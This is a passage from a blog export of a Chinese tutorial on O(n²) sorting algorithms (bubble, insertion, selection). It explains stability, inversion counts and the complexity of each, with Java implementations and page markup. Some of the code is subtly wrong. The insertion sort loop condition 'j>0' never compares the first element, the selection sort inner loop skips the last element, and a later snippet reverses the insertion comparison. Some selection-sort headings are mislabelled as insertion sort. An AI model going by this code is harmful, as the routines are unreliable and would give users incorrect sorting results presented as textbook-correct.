    |  √     | $O(n)$  | $O(n^2)$ |$O(n^2)$|\n|选择排序 |    √       |  ×     | $O(n^2)$  | $O(n^2)$ |$O(n^2)$|\n\n这三种时间复杂度为$O(n^2)$的排序算法中，冒泡排序、选择排序可能就纯粹停留在理论的层面了，实际开发中应用并不多，但是插入排序还是挺有用的。后面讲排序优化的时候，有些语言的排序函数的实现会用到插入排序算法。\n\n今天讲的三种算法，实现代码都非常简单，对于小规模的数据排序，用起来非常高效，但是在大规模数据排序的时候，这个时间复杂度就稍微有点高了。所以我们更倾向于使用下一节讲的时间复杂度为$O(n\\*logn)$的排序算法。\n\n### 课后思考\n\n我们讲过，特定的算法是依赖于特定的数据结构的。我们今天讲的几种排序算法，都是基于数组实现的。如果数组存储在链表中，这三种排序算法还能工作吗？如果能，相应的时间、空间复杂度又是多少？\n\n<br>\n<br>\n<br>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-排序(上).md","raw":"---\ntitle: 算法-排序(上)\ndate: 2018-09-20 18:35:29\ntags: ['算法','排序','冒泡排序','插入排序','选择排序']\ncategories: 算法\nmathjax: true\n---\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n排序对一个程序员来说，可能都不会陌生。大部分编程语言中，也都提供了排序函数。在平常的项目中，也经常会用到排序。排序非常重要，所以会分几节详细讲一讲经典的排序算法。\n\n排序算法太多了，可能有的连名字都没有听说过，比如猴子排序、睡眠排序、面条排序等等。这里只列举众多排序算法众多的一小撮，也是最经典的、最常用的：冒泡排序、插入排序、选择排序、归并排序、快速排序、计数排序、基数排序、桶排序。按照时间复杂度把他们分成了三类，分上中下三节来讲。\n\n|   |排序算法|时间复杂度|是否基于比较|\n|---|-----------|----------|------|\n|上|冒泡、插入、选择|$ O(n^2) $| √ |\n|中|快排、归并     |$ O(nlogN) $| √ |\n|下|桶、计数、基数  |$ O(n) $| × |\n\n带着问题去学习，是最有效的学习方法。所以按照惯例，先给出思考题：<font color=\"red\">**插入排序和冒泡排序的时间复杂度相同，都是$O(n^2)$，在实际软件开发里，为什么更倾向于使用插入排序而不是冒泡排序呢？**</font>\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 如何分析一个排序算法\n{% endnote %}\n</div>\n\n学习排序算法，除了学习他的算法原理、代码实现之外，更重要的是学会如何评价、分析一个排序算法。**那么要分析一个排序算法，要从哪几方面入手呢？**\n\n#### 一、 算法的执行效率\n\n对于排序算法的执行效率的分析，我们一般会从以下几点来进行衡量：\n\n**1、最好情况、最坏情况、平均情况时间复杂度**\n\n我们在分析排序算法的时间复杂度时，要分别给出最好情况、最坏情况、平均情况下的时间复杂度。除此之外，你还要说出最好情况、最坏情况时间复杂度对应的要排序的原始数据是什么样。\n\n为什么要区分这三种时间复杂度呢？第一，有些排序算法会区分，为了好对比，我们最好都做一下区分。第二，对于要排序的数据，有的接近有序，有的接近无序。有序度不同的数据集，对于排序的执行时间肯定会有影响的，我们要知道排序算法在不同数据下的性能表现。\n\n**2、时间复杂度的系数、常数、低阶**\n\n我们知道，时间复杂度反应的是数据规模n很大的时候的一个增长趋势，所以它表示的时候会忽略系数、常数、低阶。但是实际的软件开发中，我们排序的可能是10个、100个、1000个这样数据规模较小的数据，所以，在对同一阶时间复杂度的排序算法性能对比的时候，我们就要把系数、常数、低阶也考虑进来。\n\n**3、比较次数和交换次数**\n\n这一节和下一节讲的都是基于比较的排序算法。基于比较的排序算法的执行过程中，会涉及两种操作，一个是元素比较大小，另一个是元素交换或移动。所以，如果我们在分析排序算法的执行效率的时候，应该把比较次数和交换次数考虑进去。\n\n#### 二、 算法的内存消耗\n\n前面讲过算法的内存消耗可以通过空间复杂度来衡量，排序算法也不例外。不过针排序算法的空间复杂度，我们引入一个新概念，**原地排序**。原地排序算法，就是特指空间复杂度为O(1)的排序算法，我们这节讲的三种排序算法都是原地排序算法。\n\n#### 三、 排序算法的稳定性\n\n仅仅用执行效率和内存消耗来衡量排序算法的好坏是不够的。针对排序算法，我们还有一个重要的度量指标，**稳定性**。这个概念是说，如果待排序的序列中存在值相同的元素，经过排序之后，相等元素之间原有的先后顺序不变。\n\n我通过一个例子来解释一下。比如我们有一组数据2,9,3,4,8,3，按照大小排序之后就是2,3,3,4,8,9。\n\n这组数据里有两个3，经过某种排序算法排序之后，如果两个3的前后顺序没有改变，那我们就把这种排序算法叫做**稳定的排序算法**；如果前后顺序发生变化，那对应的排序算法就叫做**不稳定的排序算法**。\n\n你可能要问了，这两个3哪个在前，哪个在后有什么关系啊。稳不稳定又有什么关系呢？为什么要考察排序算法的稳定性呢？\n\n很多数据结构和算法的课程，再讲排序的时候，都是用整数来举列的。但在真正的软件开发中，我们要排序的往往不是单纯的整数，而是一组对象，我们需要按照对象的某个key来排序。\n\n比如说，我们现在要给电商交易系统的“订单”排序，订单有两个属性，一个是下单时间，一个是订单金额。如果我们现在有10万条订单数据，我们希望按照订单金额从小到大对订单数据进行排序，对于金额相同的订单，我们希望按照下单时间从早到晚有序，对于这样一个排序需求，我们怎么来做呢？\n\n最先想到的方法是，我们先按照金额对订单数据进行排序，然后，在遍历排序之后的订单数据，对于每个金额相同的小区间再按照下单的时间排序。这种排序思路理解起来不难，但是实现起来会很复杂。\n\n但是借助稳定排序算法，这个问题可以非常简洁的解决。解决思路是这样的，我们先按照下单时间给订单排序，注意是下单时间，不是订单金额，排序完成之后，我们再用稳定排序算法，按照订单金额重新排序。这样两遍排序之后，我们得到的就是订单数据按照金额大小从小到大排序，金额相同的订单按照下单时间从早到晚排序的。为什么呢？\n\n**稳定排序算法可以保持金额相同的两个对象，再排序前后的顺序保持不变**。第一次排序之后，所有的订单按照下单时间从早到晚有序了。在第二次排序中，我们用的是稳定的排序算法，所以经过第二次排序之后，相同金额的订单仍然保持下单时间从早到晚有序。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 冒泡排序\n{% endnote %}\n</div>\n\n我们从冒泡排序开始，学习今天的三种排序算法。\n\n冒泡排序只会操作相邻的两个数据。每次冒泡排序都会对相邻的两个数据进行比较，看是否满足大小关系要求，如果不满足就让它两互换。一次冒泡会让至少一个元素移动到它应该在的位置，重复n次，就完成了对n个数据的排序工作。\n\n我用一个例子，带你看下冒泡排序的整个过程。我们要对一组数据4,5,6,3,2,1，从小到大进行排序。第一次冒泡排序的详细过程就是这样：\n\n{% asset_img 冒泡排序第一次过程.png %}\n\n可以看出，经过第一次冒泡排序之后，6这个元素已经存储在正确的位置上了。要想完成所有数据的排序，我们只需要进行6次这样的冒泡排序操作就对了。\n\n{% asset_img 冒泡排序过程.jpg %}\n\n实际上，刚才的冒泡排序还可以优化，当某次操作已经没有数据交换时，说明已经完全有序，不需要在执行后续的冒泡操作了。我这里给一个例子，这里面给6个元素排序，只需要4次冒泡操作就可以了。\n\n| 冒泡次数 | 冒泡结果 | 是否有数据交换|\n|---------|---------|--------------|\n| 初始状态 |3，5，4，1，2，6|    -       |\n|第一次冒泡|3，4，1，2，5，6|     有     |\n|第二次冒泡|3，1，2，4，5，6|     有     |\n|第三次冒泡|1，2，3，4，5，6|     有     |\n|第四次冒泡|1，2，3，4，5，6|  无，结束排序操作|     \n\n冒泡排序算法的原理比较好理解，具体的代码如下，你可以结合代码理解原理。\n\n```java\n// 冒泡排序 a表示需要排序的数组 n表示数组的大小\npublic void bubbleSort(int[] a,int n){\n    for(int i=0;i<n-1;i++){\n        boolean flag = false;\n        for(int j=0;j<n-1-i;j++){\n            if(a[j]>a[j+1]){\n                int temp = a[j];\n                a[j] = a[j+1];\n                a[j+1] = temp;\n                flag = true;\n            }\n        }\n        if(!flag) break;\n    }\n}\n```\n\n现在结合上面分析算法的三个方面，有三个问题要问你。\n\n**第一、冒泡排序是原地排序算法吗？**\n\n冒泡的过程只涉及相邻两个数据的交换操作，字需要一个常量级的临时空间，所以它的空间复杂度是O(1)，是一个原地排序算法。\n\n**第二、冒泡排序是稳定的排序算法吗？**\n\n在冒泡排序中，只有交换才可以改变两个元素的前后位置。为了保证冒泡排序算法的稳定性，当有相邻的两个元素相等时，我们不做交换，相同大小的数据在排序前后不改变顺序，所以冒泡排序算法是稳定的排序算法。\n\n**第三、冒泡排序的时间复杂度是多少？**\n\n最好的情况下，要排序的数据已经是有序的了，我们只需要进行一次冒泡排序就可以了，所以最好的时间复杂度为$O(n)$。而在最坏情况下，要排序的数据是倒序排列的，我们需要进行n次冒泡排序，所以最坏情况时间复杂度为$O(n^2)$。\n\n最好、最好情况时间复杂度很容易区分，那平均情况时间复杂度是多少呢？我们前面讲过，平均时间复杂度就是加权平均期望时间复杂度，分析的时候要结合概率论的知识。\n\n对于包含n个元素的数组，这n个数据有 n! 种排列方式。不同的排列方式，冒泡排序执行的时间是不同的。比如我们前面举的那个例子，一个需要6次冒泡，而另一个只需要4次。如果用概率论的方法定量分析平均时间复杂度，那涉及到的数学推理和计算就会很复杂。我这里还有一种思路，通过**有序度**和**逆序度**这两个概念来分析。\n\n有序度是数组中具有有序关系的元素对的个数。有序元素对用数学表达式表示就是这样： $a[i] <= a[j], 如果i < j$。\n\n2,4,3,1,5,6 这组数据的有序度为11。因其有序元素对为11个，分别是: (2,4) (2,3) (2,5) (2,6) (4,5) (4,6) (3,5) (3,6) (1,5) (1,6) (5,6)\n\n同理，对于一个倒序排列的数组，比如 6,5,4,3,2,1，有序度为0；对于一个完全有序的数组，比如1,2,3,4,5,6，有序度就是n\\*(n-1)/2，也就是15.我们把完全有序的数组的有序度叫做**满有序度**。\n\n逆序度的定义正好跟有序度的定义相反(默认从小到大为有序)，我想你已经想到了。关于逆序度，我们就不举例子说明了。你可以结合有序度的例子自己看一下：$a[i] > a[j], 如果i < j$。\n\n关于这三个概念，我们可以得到一个公式：**逆序度 = 满有序度 - 有序度**。我们排序的过程就是一种增加有序度，减少逆序度的过程，最后达到满有序度，就说明排序完成了。\n\n我还是拿前面举得那个冒泡排序的例子说明。要排序的数组的初始状态为4,5,6,3,2,1，其中，有序元素对(4,5)、(4,6)、(5,6)，所以有序度为3。 n=6，所以排序完成之后终态的满有序度为15.\n\n| 冒泡次数 | 冒泡结果 | 有序度|\n|---------|---------|--------------| \n| 初始状态 |4，5，6，3，2，1 |  3  |\n|第一次冒泡|4，5，3，2，1，6 |  6  |\n|第二次冒泡|4，3，2，1，5，6 |  9  |\n|第三次冒泡|3，2，1，4，5，6 | 12  |\n|第四次冒泡|2，1，3，4，5，6 | 14  |\n|第五次冒泡|1，2，3，4，5，6 | 15  |\n\n冒泡排序包含两个原子操作，**比较**和**交换**。每交换一次，有序度就加1,。不管算法怎么改进，交换次数是确定的，即为**逆序度，也就是n\\*(n-1)/2 - 初始有序度**。此例中就是15-3=12，也就是要进行12次交换操作。\n\n对于包含n个数据的数组进行冒泡排序，平均交换次数是多少呢？最坏情况下，初始状态的有序度为0，所有要进行n\\*(n-1)、2次交换。最好情况下，初始状态的有序度为满有序度，就不需要进行交换。我们去平均值n\\*(n-1)/4，来表示初始有序度既不是很高也不是很低的平均情况。\n\n换句话说，平均情况下需要n\\*(n-1)/4次交换操作，比较操作肯定要比交换操作多，而时间复杂度的上限位$O(n^2)$，所以平均情况下的时间复杂度就是$O(n^2)$。\n\n这个平均时间复杂度的推导过程并不严格，但是很多时候很有用，毕竟概率论的定量分析太复杂，不太好用。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 插入排序\n{% endnote %}\n</div>\n\n我们先来看一个问题。如果一个有序的数组，我们往里面添加一个新的数据后，如何继续保持数据有序呢？很简单，我们只要遍历数组，找到数据应该插入的位置将其插入即可。\n\n这是一个动态排序的过程，即动态的往有序集合中添加数据，我们可以通过这种方法保持集合中的数据一直有序。而对于一组静态数据，我们也可以借鉴上面讲的插入方法，来进行排序，于是就有了插入排序算法。\n\n那插入排序是如何借助上面的思想来实现排序的呢？\n\n首先，我们将数组中的数据分为两个区间，**已排序区间**和**未排序区间**。初始已排序区间只有一个元素，就是数组中的第一个元素。插入排序算法的核心思想是取未排序区间的元素，在已排序区间中找到合适的位置插入，并保证已排序区间中的元素一直有序，重复这个过程，知道未排序区间中元素为空，算法结束。\n\n如图所示，要排序的数据是4,5,6,1,3,2，其中左侧为已排序区间，右侧为未排序区间。\n\n{% asset_img 插入排序过程.jpg %}\n\n插入排序也包含两种操作，一种是元素的比较，一种是元素的移动。当我们需要将一个元素a插入到已排序区间时，需要先拿a和已排序区间的元素一次比较大小，找到合适的位置插入。找到插入点之后，我们还需要将插入点之后的额元素顺序往后移动一位，这样才能腾出空间为元素a插入。\n\n对于不同的查找插入点的方法（从头到尾、从尾到头），元素的比较次数是有区别的。但对于一个给定的初始序列，移动操作的次数是固定的，就等于逆序度。\n\n为什么说移动次数就等于逆序度呢？我拿刚才的例子画一个图表，你一看就明白了。满有序度是n\\*(n-1)/2=15, 初始有序度为5，所以逆序度为10,。插入排序中，数据移动的个数总和也等于3+3+4=10。\n\n{% asset_img 插入排序移动次数.jpg %}\n\n插入排序的原理也很简单吧。你也可以结合一下代码理解插入排序：\n\n```java\npublic void insertSort(int[] a, int n){\n\tif(n<=1) return;\n\tfor(int i=1;i<n;i++){\n\t\tint val = a[i];\n\t\tint j=i-1;\n\t\tfor(;j>0;j--){\n\t\t\tif(a[j]>val){\n\t\t\t\ta[j+1] = a[j];\n\t\t\t}else {\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\ta[j+1] = val;\n\t}\n}\n```\n\n现在同样有三个问题。\n\n**第一、插入排序是原地排序算法吗？**\n\n从实现过程可以明显的看出，插入排序的运行不需要额外的存储空间，所以插入排序的空间复杂度为O(1)，是一个原地排序算法。\n\n**第二、插入排序是稳定的排序算法吗？**\n\n在插入排序中，对于值相同的元素，我们可以选择将后面出现的元素，插入到前面出现的元素的后面，这样就可以保持原有的前后顺序不变，所有插入排序是稳定排序算法。\n\n**第三、插入排序的时间复杂度是多少？**\n\n如果要排序的数据已经是有序的，我们并不需要搬移任何数据。如果我们从尾到头在有序数组里查找插入位置，每次只需比较一个数据就能确定插入的位置。所以这种情况下，最好是时间复杂度为O(n)。注意，这里是**从尾到头遍历已经有序的数据**。\n\n如果数组是倒序的，每次插入都相当于在数组的第一个位置插入新的数据，所以需要搬移大量的数据，所以最坏情况下的时间复杂度为$O(n^2)$。\n\n还记得我们在一个数组中插入一个数据的平均复杂度是多少吗？没错，是O(n)，所以对于插入排序来说，每次插入操作都相当于在数组中插入一个数据，执行n次插入操作，所以平均时间复杂度为$O(n^2)$。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 选择排序\n{% endnote %}\n</div>\n\n选择排序算法的实现思路有点类似插入排序，也分已排序区间和未排序区间。但是选择排序每次会从未排序区间中找到最小元素，将其放到已排序区间的末尾。\n\n{% asset_img 选择排序过程.jpg %}\n\n同样，也有三个问题需要你思考。\n\n**第一、插入排序是原地排序算法吗？**\n\n首先选择排序的空间复杂度为O(1)，所以是一种原地排序算法。\n\n**第二、插入排序的时间复杂度是多少？**\n\n选择排序最好情况时间复杂度、最坏情况时间复杂度、平均情况时间复杂度均为$O(n^2)$。你可以自己分析看看。\n\n**第三、插入排序是稳定的排序算法吗？**\n\n答案是否定的，选择排序是一种不稳定的排序算法。从选择排序的原理示意图可以看出，选择排序每次都要找剩余排序元素中的最小值，并和前面元素交换位置，这就破坏了稳定性。\n\n比如5,8,5,2,9这样一组数据，使用选择排序来排序的话，第一次找到最小元素2，与第一个5交换位置，那第一个5个中间5的顺序就变了，所以就不稳定了。正是因此，相对于冒泡排序和插入排序，选择排序就稍微逊色了。\n\n```java\npublic void selectSort(int[] a, int n){\n    for(int i=0;i<n-1;i++){\n        for(int j=i+1; j<n-1;j++){\n        \tif(a[j]<a[i]){\n        \t\tint temp = a[j];\n        \t\ta[j] = a[i];\n        \t\ta[i] = temp;\n        \t}\n        }\n    }\n}\n```\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 解答开篇\n{% endnote %}\n</div>\n\n基本的知识都讲完了，我们来看看开篇的问题：冒泡排序和插入排序的时间复杂度都为$O(n^2)$，都是原地排序算法，为什么插入排序要比冒泡排序更受欢迎呢？\n\n我们前面分析冒泡排序和插入排序的时候讲到，冒泡排序不管怎么优化，元素交换的次数是一个固定的值，是原始数据的逆序度。插入排序是同样的，不管怎么优化，移动次数等于原始数据的逆序度。\n\n但是从代码实现上来看，冒泡排序的数据交换要比插入排序的数据移动要复杂，冒泡排序需要3个赋值操作，而插入排序只需要一个。我们来看一下下面这段操作：\n\n```java\n// 冒泡排序中的数据交换操作\n if(a[j]>a[j+1]){\n    int temp = a[j];\n    a[j] = a[j+1];\n    a[j+1] = temp;\n    flag = true;\n}\n\n// 插入排序中数据移动操作\nif(a[j]<val){\n    a[j+1] = a[j];\n}else {\n    break;\n}\n```\n\n我们把执行一个赋值语句的时间粗略的估计为单位时间unit_time，然后分别用冒泡排序和插入排序对同一个逆序度为K的数组进行排序。用冒泡排序需要K次交换操作，每次需要3个赋值语句，所以交换操作总耗时就是3K单位时间。而插入排序中数据移动操作只需要K个单位时间。\n\n所以，虽然冒泡排序和插入排序的时间复杂度是一样的，但是如果我们希望把性能优化做到极致，那肯定首选插入排序。插入排序的算法思路也有很大的优化空间，我们只讲了最基础的一种。如果你对插入排序的优化感兴趣，可以自己学习一下希尔排序。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 内容小结\n{% endnote %}\n</div>\n\n想要分析、评价一个排序算法，需要从执行效率、内存消耗和稳定性三个方面来看。因此这一节，分析了三种时间复杂度为$O(n^2)$的排序算法：冒泡排序、插入排序、选择排序。需要重点掌握的是它们的分析方法。\n\n|排序算法 | 是否原地排序| 是否稳定|   最好    |   最坏  |   平均  |\n|--------|------------|--------|-----------|---------|---------|\n|冒泡排序 |    √       |  √     | $O(n)$  | $O(n^2)$ |$O(n^2)$|\n|插入排序 |    √       |  √     | $O(n)$  | $O(n^2)$ |$O(n^2)$|\n|选择排序 |    √       |  ×     | $O(n^2)$  | $O(n^2)$ |$O(n^2)$|\n\n这三种时间复杂度为$O(n^2)$的排序算法中，冒泡排序、选择排序可能就纯粹停留在理论的层面了，实际开发中应用并不多，但是插入排序还是挺有用的。后面讲排序优化的时候，有些语言的排序函数的实现会用到插入排序算法。\n\n今天讲的三种算法，实现代码都非常简单，对于小规模的数据排序，用起来非常高效，但是在大规模数据排序的时候，这个时间复杂度就稍微有点高了。所以我们更倾向于使用下一节讲的时间复杂度为$O(n\\*logn)$的排序算法。\n\n### 课后思考\n\n我们讲过，特定的算法是依赖于特定的数据结构的。我们今天讲的几种排序算法，都是基于数组实现的。如果数组存储在链表中，这三种排序算法还能工作吗？如果能，相应的时间、空间复杂度又是多少？\n\n<br>\n<br>\n<br>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-排序(上)","published":1,"updated":"2019-06-30T16:32:22.420Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2nl006bo25t80wwrbwk","content":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>排序对一个程序员来说，可能都不会陌生。大部分编程语言中，也都提供了排序函数。在平常的项目中，也经常会用到排序。排序非常重要，所以会分几节详细讲一讲经典的排序算法。</p>\n<p>排序算法太多了，可能有的连名字都没有听说过，比如猴子排序、睡眠排序、面条排序等等。这里只列举众多排序算法众多的一小撮，也是最经典的、最常用的：冒泡排序、插入排序、选择排序、归并排序、快速排序、计数排序、基数排序、桶排序。按照时间复杂度把他们分成了三类，分上中下三节来讲。</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>排序算法</th>\n<th>时间复杂度</th>\n<th>是否基于比较</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>上</td>\n<td>冒泡、插入、选择</td>\n<td>$ O(n^2) $</td>\n<td>√</td>\n</tr>\n<tr>\n<td>中</td>\n<td>快排、归并</td>\n<td>$ O(nlogN) $</td>\n<td>√</td>\n</tr>\n<tr>\n<td>下</td>\n<td>桶、计数、基数</td>\n<td>$ O(n) $</td>\n<td>×</td>\n</tr>\n</tbody>\n</table>\n<p>带着问题去学习，是最有效的学习方法。所以按照惯例，先给出思考题：<font color=\"red\"><strong>插入排序和冒泡排序的时间复杂度相同，都是$O(n^2)$，在实际软件开发里，为什么更倾向于使用插入排序而不是冒泡排序呢？</strong></font></p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"如何分析一个排序算法\"><a href=\"#如何分析一个排序算法\" class=\"headerlink\" title=\"如何分析一个排序算法\"></a>如何分析一个排序算法</h3></div><br></div>\n\n<p>学习排序算法，除了学习他的算法原理、代码实现之外，更重要的是学会如何评价、分析一个排序算法。<strong>那么要分析一个排序算法，要从哪几方面入手呢？</strong></p>\n<h4 id=\"一、-算法的执行效率\"><a href=\"#一、-算法的执行效率\" class=\"headerlink\" title=\"一、 算法的执行效率\"></a>一、 算法的执行效率</h4><p>对于排序算法的执行效率的分析，我们一般会从以下几点来进行衡量：</p>\n<p><strong>1、最好情况、最坏情况、平均情况时间复杂度</strong></p>\n<p>我们在分析排序算法的时间复杂度时，要分别给出最好情况、最坏情况、平均情况下的时间复杂度。除此之外，你还要说出最好情况、最坏情况时间复杂度对应的要排序的原始数据是什么样。</p>\n<p>为什么要区分这三种时间复杂度呢？第一，有些排序算法会区分，为了好对比，我们最好都做一下区分。第二，对于要排序的数据，有的接近有序，有的接近无序。有序度不同的数据集，对于排序的执行时间肯定会有影响的，我们要知道排序算法在不同数据下的性能表现。</p>\n<p><strong>2、时间复杂度的系数、常数、低阶</strong></p>\n<p>我们知道，时间复杂度反应的是数据规模n很大的时候的一个增长趋势，所以它表示的时候会忽略系数、常数、低阶。但是实际的软件开发中，我们排序的可能是10个、100个、1000个这样数据规模较小的数据，所以，在对同一阶时间复杂度的排序算法性能对比的时候，我们就要把系数、常数、低阶也考虑进来。</p>\n<p><strong>3、比较次数和交换次数</strong></p>\n<p>这一节和下一节讲的都是基于比较的排序算法。基于比较的排序算法的执行过程中，会涉及两种操作，一个是元素比较大小，另一个是元素交换或移动。所以，如果我们在分析排序算法的执行效率的时候，应该把比较次数和交换次数考虑进去。</p>\n<h4 id=\"二、-算法的内存消耗\"><a href=\"#二、-算法的内存消耗\" class=\"headerlink\" title=\"二、 算法的内存消耗\"></a>二、 算法的内存消耗</h4><p>前面讲过算法的内存消耗可以通过空间复杂度来衡量，排序算法也不例外。不过针排序算法的空间复杂度，我们引入一个新概念，<strong>原地排序</strong>。原地排序算法，就是特指空间复杂度为O(1)的排序算法，我们这节讲的三种排序算法都是原地排序算法。</p>\n<h4 id=\"三、-排序算法的稳定性\"><a href=\"#三、-排序算法的稳定性\" class=\"headerlink\" title=\"三、 排序算法的稳定性\"></a>三、 排序算法的稳定性</h4><p>仅仅用执行效率和内存消耗来衡量排序算法的好坏是不够的。针对排序算法，我们还有一个重要的度量指标，<strong>稳定性</strong>。这个概念是说，如果待排序的序列中存在值相同的元素，经过排序之后，相等元素之间原有的先后顺序不变。</p>\n<p>我通过一个例子来解释一下。比如我们有一组数据2,9,3,4,8,3，按照大小排序之后就是2,3,3,4,8,9。</p>\n<p>这组数据里有两个3，经过某种排序算法排序之后，如果两个3的前后顺序没有改变，那我们就把这种排序算法叫做<strong>稳定的排序算法</strong>；如果前后顺序发生变化，那对应的排序算法就叫做<strong>不稳定的排序算法</strong>。</p>\n<p>你可能要问了，这两个3哪个在前，哪个在后有什么关系啊。稳不稳定又有什么关系呢？为什么要考察排序算法的稳定性呢？</p>\n<p>很多数据结构和算法的课程，再讲排序的时候，都是用整数来举列的。但在真正的软件开发中，我们要排序的往往不是单纯的整数，而是一组对象，我们需要按照对象的某个key来排序。</p>\n<p>比如说，我们现在要给电商交易系统的“订单”排序，订单有两个属性，一个是下单时间，一个是订单金额。如果我们现在有10万条订单数据，我们希望按照订单金额从小到大对订单数据进行排序，对于金额相同的订单，我们希望按照下单时间从早到晚有序，对于这样一个排序需求，我们怎么来做呢？</p>\n<p>最先想到的方法是，我们先按照金额对订单数据进行排序，然后，在遍历排序之后的订单数据，对于每个金额相同的小区间再按照下单的时间排序。这种排序思路理解起来不难，但是实现起来会很复杂。</p>\n<p>但是借助稳定排序算法，这个问题可以非常简洁的解决。解决思路是这样的，我们先按照下单时间给订单排序，注意是下单时间，不是订单金额，排序完成之后，我们再用稳定排序算法，按照订单金额重新排序。这样两遍排序之后，我们得到的就是订单数据按照金额大小从小到大排序，金额相同的订单按照下单时间从早到晚排序的。为什么呢？</p>\n<p><strong>稳定排序算法可以保持金额相同的两个对象，再排序前后的顺序保持不变</strong>。第一次排序之后，所有的订单按照下单时间从早到晚有序了。在第二次排序中，我们用的是稳定的排序算法，所以经过第二次排序之后，相同金额的订单仍然保持下单时间从早到晚有序。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"冒泡排序\"><a href=\"#冒泡排序\" class=\"headerlink\" title=\"冒泡排序\"></a>冒泡排序</h3></div><br></div>\n\n<p>我们从冒泡排序开始，学习今天的三种排序算法。</p>\n<p>冒泡排序只会操作相邻的两个数据。每次冒泡排序都会对相邻的两个数据进行比较，看是否满足大小关系要求，如果不满足就让它两互换。一次冒泡会让至少一个元素移动到它应该在的位置，重复n次，就完成了对n个数据的排序工作。</p>\n<p>我用一个例子，带你看下冒泡排序的整个过程。我们要对一组数据4,5,6,3,2,1，从小到大进行排序。第一次冒泡排序的详细过程就是这样：</p>\n<img src=\"/posts/2018-09-20-算法-排序(上)/冒泡排序第一次过程.png\">\n<p>可以看出，经过第一次冒泡排序之后，6这个元素已经存储在正确的位置上了。要想完成所有数据的排序，我们只需要进行6次这样的冒泡排序操作就对了。</p>\n<img src=\"/posts/2018-09-20-算法-排序(上)/冒泡排序过程.jpg\">\n<p>实际上，刚才的冒泡排序还可以优化，当某次操作已经没有数据交换时，说明已经完全有序，不需要在执行后续的冒泡操作了。我这里给一个例子，这里面给6个元素排序，只需要4次冒泡操作就可以了。</p>\n<table>\n<thead>\n<tr>\n<th>冒泡次数</th>\n<th>冒泡结果</th>\n<th>是否有数据交换</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>初始状态</td>\n<td>3，5，4，1，2，6</td>\n<td>-</td>\n</tr>\n<tr>\n<td>第一次冒泡</td>\n<td>3，4，1，2，5，6</td>\n<td>有</td>\n</tr>\n<tr>\n<td>第二次冒泡</td>\n<td>3，1，2，4，5，6</td>\n<td>有</td>\n</tr>\n<tr>\n<td>第三次冒泡</td>\n<td>1，2，3，4，5，6</td>\n<td>有</td>\n</tr>\n<tr>\n<td>第四次冒泡</td>\n<td>1，2，3，4，5，6</td>\n<td>无，结束排序操作</td>\n</tr>\n</tbody>\n</table>\n<p>冒泡排序算法的原理比较好理解，具体的代码如下，你可以结合代码理解原理。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 冒泡排序 a表示需要排序的数组 n表示数组的大小</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">bubbleSort</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a,<span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;n-<span class=\"number\">1</span>;i++)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">boolean</span> flag = <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> j=<span class=\"number\">0</span>;j&lt;n-<span class=\"number\">1</span>-i;j++)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(a[j]&gt;a[j+<span class=\"number\">1</span>])&#123;</span><br><span class=\"line\">                <span class=\"keyword\">int</span> temp = a[j];</span><br><span class=\"line\">                a[j] = a[j+<span class=\"number\">1</span>];</span><br><span class=\"line\">                a[j+<span class=\"number\">1</span>] = temp;</span><br><span class=\"line\">                flag = <span class=\"keyword\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!flag) <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span 